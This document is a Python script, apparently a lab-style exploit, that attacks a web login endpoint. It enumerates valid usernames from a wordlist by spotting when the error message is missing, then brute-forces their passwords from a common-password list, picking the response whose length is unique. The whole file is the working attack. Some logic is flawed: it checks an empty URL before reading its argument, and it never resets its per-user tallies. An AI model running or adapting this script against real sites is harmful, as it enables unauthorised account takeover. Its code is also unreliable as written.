import requests
import sys

INVALID_USERNAME_RESPONSE = "Invalid username or password."
# VALID_USERNAME_RESPONSE = "Invalid username or password"

headers = {
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36'
}

payload = {
    'username': '',
    'password': '',
}

usernames = open('./../common_username.txt', 'r', encoding='utf-8').read().strip().split('\n')
passwords = open('./../common_password.txt', 'r', encoding='utf-8').read().strip().split('\n')


def is_valid_url(url):
    try:
        r = requests.get(url, timeout=5)
        return r.status_code == 200
    except requests.exceptions.RequestException:
        return False

def validate_usernames(s, url):
    url_login = url + '/login'

    with open('validate_username.txt', 'w', encoding='utf-8') as f:
        validate_users = []

        f.write('username,length,status_code\n')
        for username in usernames:
            payload['username'] = username
            payload['password'] = '123456789'
            req = s.post(url_login, data=payload, headers=headers)

            length = len(req.content)
            f.write(f"{username},{len(req.content)},{req.status_code}\n")
            print(username, len(req.content))

            if INVALID_USERNAME_RESPONSE not in req.text:
                validate_users.append(username)

        if not len(validate_users):
            print('Don\'t have username valid in the list')
            sys.exit(-1)
        
        return validate_users

# Check validate password for username found above

def bruteforce_pass(s, url, validate_users):
    url_login = url + '/login'
    with open('validate_password.txt', 'w', encoding='utf-8') as f:
        res = {}
        count = {}
        validate_account = []

        f.write('password,length,status_code\n')
        for valid_username in validate_users:
            for password in passwords:
                payload['username'] = valid_username
                payload['password'] = password
                req = s.post(url_login, data=payload, headers=headers)
                
                length = len(req.content)
                count[length] = count.get(length, 0) + 1
                res[password] = length

                f.write(f"{password},{len(req.content)},{req.status_code}\n")
                print(password, len(req.content))

            validate_account = []
            for password, length in res.items():
                if count[length] == 1:
                    validate_account.append((valid_username, password))
                    break
    if len(validate_account):
        print("(+) Succesfully bruteforce accounts credential")
        print(f'List accounts: {validate_account}')
    else:
        print("(-) Exploit failed")
        sys.exit(-1)

def main():
    URL = ''
    if not is_valid_url(URL):
        print("(+) Invalid URL")
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)
    elif len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    s = requests.Session()
    url = URL if URL != '' else sys.argv[1]
    valid_users = validate_usernames(s, url)
    bruteforce_pass(s, url, valid_users)


if __name__ == '__main__':
    main()
